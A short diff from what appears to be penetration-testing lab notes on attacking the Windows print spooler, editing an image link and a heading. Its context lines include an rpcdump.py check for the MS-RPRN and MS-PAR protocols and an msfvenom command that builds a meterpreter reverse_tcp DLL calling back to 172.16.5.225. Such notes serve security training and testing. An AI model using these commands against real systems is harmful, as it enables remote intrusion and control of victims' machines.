@@ -18,8 +18,9 @@ python3 ./setup.py install
 ``` shell
 rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 ```
-![Pasted image 20250312201645](https://github.com/user-attachments/assets/db2135bc-6dac-4c30-8f1c-12feb1ea1b73)
-crafting a DLL payload using `msfvenom`.
+![image](https://github.com/user-attachments/assets/8665824e-4cd1-4d2c-9491-c08b70765227)
+
+##crafting a DLL payload using `msfvenom`.
 ### Generating a DLL Payload
 ``` shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
